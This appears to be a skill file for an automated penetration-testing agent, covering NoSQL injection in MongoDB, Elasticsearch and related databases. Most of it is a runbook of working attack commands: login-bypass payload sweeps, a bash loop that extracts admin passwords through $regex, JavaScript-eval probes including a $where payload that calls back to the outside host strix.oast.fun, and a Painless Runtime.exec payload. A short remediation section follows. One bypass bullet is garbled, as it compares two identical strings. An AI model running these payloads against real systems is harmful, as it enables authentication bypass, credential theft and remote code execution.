---
name: nosql-injection
description: NoSQL injection across MongoDB / Mongoose / Couch / Cassandra / Firestore operator-abuse and JS-eval channels
triggers: [nosqli, mongo, mongoose, $ne, $gt, $where, couchdb, cassandra, firestore, $regex]
---

# NoSQL Injection

NoSQL injection exploits two distinct failure modes: **operator injection** (the client supplies an object where a string was expected; the database operators activate) and **server-side JavaScript evaluation** (`$where` / `mapReduce` / `eval` execute attacker-controlled JS). The fix and the symptoms differ from classic SQLi.

CWE-943. Companion to `scan_nosql_injection`.

## Attack Surface

**Databases**
- **MongoDB / Mongoose** — by far the most common in modern web apps. Operator injection via `{$ne}`, `{$gt}`, `{$regex}`, `{$where}` (JS eval), `$expr` with `$function` (post 4.4 — JS eval again).
- **CouchDB** — JS eval via `_find` + Mango selectors with `$elemMatch` / regex; `_design` doc abuse for stored XSS-via-rev.
- **Cassandra (CQL)** — closer to SQL; `WHERE` clause injection works similarly to SQLi for the operator-aware subset.
- **Redis** — Lua eval via `EVAL`; injection where the app concatenates user input into Lua scripts.
- **Firebase Firestore** — no server-side query injection per se (rules-enforced), but client-supplied filter operators can leak admin-shaped data when security rules are weak.
- **Elasticsearch** — query-DSL injection when the app builds JSON queries from user input; `script` field with Painless DSL allows code execution.

**Where to find it**
- Login forms (the classic `{"username": "admin", "password": {"$ne": null}}` bypass)
- Search endpoints accepting JSON bodies
- Filter / sort params expressed as URL query strings (Mongoose's qs middleware auto-converts `?password[$ne]=` → `{password: {$ne: ''}}`)
- API endpoints with `find()`, `findOne()`, `aggregate()` taking partially-user-controlled queries
- Admin tools / report generators that accept raw filter JSON

## Detection Channels

### Operator injection (MongoDB classic)

Login bypass — the canonical first probe:
```bash
# JSON body
curl -X POST 'https://<TARGET>/login' \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin", "password": {"$ne": null}}'

# Query-string version (Express + qs / body-parser default)
curl 'https://<TARGET>/login?username=admin&password[$ne]=null'
```

Successful auth bypass → JSON success body / 200 + `Set-Cookie: session=...`. Confirms operator injection.

### Boolean-based extraction

```bash
# Probe whether a regex matches — leaks one character at a time
curl "https://<TARGET>/api/users?username=admin&password[\$regex]=^a"
curl "https://<TARGET>/api/users?username=admin&password[\$regex]=^b"
# Compare response shapes; one match → that's the first char
```

### `$where` / `$function` JS evaluation (MongoDB)

When the app passes user input into a `$where` filter or `$expr` + `$function`:
```javascript
// Vulnerable app code:
collection.find({$where: "this.password == '" + user_input + "'"});

// Attacker injects:
'); sleep(5000); ('
// Result evaluated as JS — the sleep is observable timing.
```

### Time-based probe (MongoDB `$where`)
```bash
# Confirm JS eval via timing
START=$(date +%s%N)
curl -s "https://<TARGET>/api/find" \
  -d '{"query": {"$where": "sleep(5000) || true"}}'
END=$(date +%s%N)
echo "Elapsed: $((($END-$START)/1000000)) ms"
# >5000ms confirms $where eval
```

## Operational Runbook

### Step 1 — operator injection sweep

```bash
# Authn bypass payloads — try each
for pw_payload in \
    '{"$ne": null}' \
    '{"$ne": ""}' \
    '{"$gt": ""}' \
    '{"$regex": ".*"}' \
    '{"$exists": true}'; do
  printf "$pw_payload → "
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
    -X POST 'https://<TARGET>/login' \
    -H 'Content-Type: application/json' \
    -d "{\"username\": \"admin\", \"password\": $pw_payload}"
done
```

Compare against a baseline `{"username": "admin", "password": "invalid"}`. Different response (2xx with token / size) → bypass works.

### Step 2 — extract credentials via boolean-blind

```bash
# Use NoSQLMap or hand-craft a regex extractor
nosqlmap -u 'https://<TARGET>/api/login' --auth basic

# Or manual char-by-char extraction
EXTRACTED=""
for pos in {1..30}; do
  for c in {a..z} {A..Z} {0..9}; do
    response=$(curl -s -X POST 'https://<TARGET>/login' \
      -H 'Content-Type: application/json' \
      -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^${EXTRACTED}${c}\"}}")
    if echo "$response" | grep -q '"success":true'; then
      EXTRACTED="${EXTRACTED}${c}"
      echo "Position $pos: ${EXTRACTED}"
      break
    fi
  done
done
```

### Step 3 — `$where` JS eval (when available)

```bash
# OAST via DNS exfil
curl -s -X POST 'https://<TARGET>/api/find' \
  -H 'Content-Type: application/json' \
  -d '{"query": {"$where": "function(){ var x = require(\"dns\").lookup(\"strix.oast.fun\", function(){}); return false; }"}}'
```

`require()` is sandboxed in newer MongoDB — usually unavailable. When it works, you're in Node territory and have RCE.

### Step 4 — `$function` / `$accumulator` (MongoDB 4.4+)

```bash
# Newer aggregation eval surfaces
curl -s 'https://<TARGET>/api/aggregate' \
  -d '{
    "pipeline": [{
      "$match": {"$expr": {
        "$function": {"body": "function(){return true}", "args": [], "lang": "js"}
      }}
    }]
  }'
```

If the app passes a user-supplied `body`: code execution in mongod's JS context.

### Step 5 — Elasticsearch / Painless script

```bash
# Painless DSL — when the app forwards user-supplied script fields
curl -X POST 'https://<TARGET>/api/search' \
  -d '{
    "query": {
      "script": {
        "script": {
          "source": "java.lang.Runtime.getRuntime().exec(\"id\")",
          "lang": "painless"
        }
      }
    }
  }'
```

Painless is sandboxed but historically full of bypass CVEs — try this on Elastic stack version <7.x.

## Bypass Techniques

- **Type juggling**: when the app `JSON.parse`s the body, you get full object semantics for free. When it accepts query-string only, frameworks like Express+qs auto-convert `?p[$ne]=x` into nested objects.
- **Unicode normalisation**: `$ne` instead of `$ne` — some sanitisers regex on the literal string.
- **Operator stacking**: `{"$or": [{"username": "admin"}, {"username": "root"}]}` — bypass per-field denylists.
- **Schema-walk**: when one field is parameterised but adjacent fields aren't, walk the schema (e.g., `password` is escaped but `passwordResetToken` isn't).

## Validation

1. Confirm operator injection by toggling between true / false predicates (`{$ne: null}` vs `{$eq: null}`) and observing different response shapes.
2. Extract a verifiable secret: admin's password regex char-by-char, or a known-internal-only field via projection abuse.
3. For `$where` / `$function`: show a deterministic side-effect (timing delay or OAST hit).
4. Reproduce the payload from a clean session.

## False Positives

- Generic 500 errors unrelated to query semantics — server might just be barfing on JSON-shaped input.
- ORM-level denylist returning a clean 400 for any field containing `$` — operator injection IS denied; the response shape just looks like an injection-allowed app.
- Static response sizes from a CDN — confirm the diff is server-side, not edge-cached.

## Impact

- Authentication bypass — the classic `{$ne: null}` win on any login that compares password via Mongoose without conversion.
- Mass data exfil via regex / `$exists` enumeration.
- RCE via `$where` / `$function` JS eval (older versions; sandbox bypass CVEs).
- Privilege escalation via aggregation pipelines that surface admin-shaped objects.

## Remediation

1. **Cast user input to the expected type** at the input boundary: `username = String(req.body.username)`. Removes operator-injection surface.
2. Use parameterised query builders (Mongoose's `find({username: req.body.username})` with strict schema), not string concatenation.
3. Disable `$where` and `$function` server-side: `--noscripting` flag on mongod (MongoDB 4.0+) / drop the privilege from the connection role.
4. Validate JSON body shape with a schema validator (`ajv`, `joi`, `zod`) — reject objects when strings are expected.
5. For Elasticsearch: disable inline scripts (`script.allowed_types: stored`) and use stored scripts only.

## Pro Tips

1. The first probe should always be `{"$ne": null}` on a login form. It's the highest hit-rate single payload in NoSQLi history.
2. Express + qs is the canonical vulnerable stack — even seemingly-safe `?password=foo` becomes object-injectable as `?password[$ne]=`.
3. When the app uses `bcrypt.compare(req.body.password, user.password_hash)`, operator injection on the password itself is blocked — but the username field is often still vulnerable.
4. NoSQLMap is mature for MongoDB — use it on confirmed targets to speed up enumeration.
5. Check the GraphQL schema for `filter` arg types — many GraphQL APIs accept `JSONObject` filters that forward to Mongoose unchecked.

## Summary

Modern NoSQLi is two distinct classes: operator injection (cast to expected type to fix) and server-side JS eval (disable scripting to fix). The fastest detection on any login form remains the 12-year-old `{$ne: null}` payload.
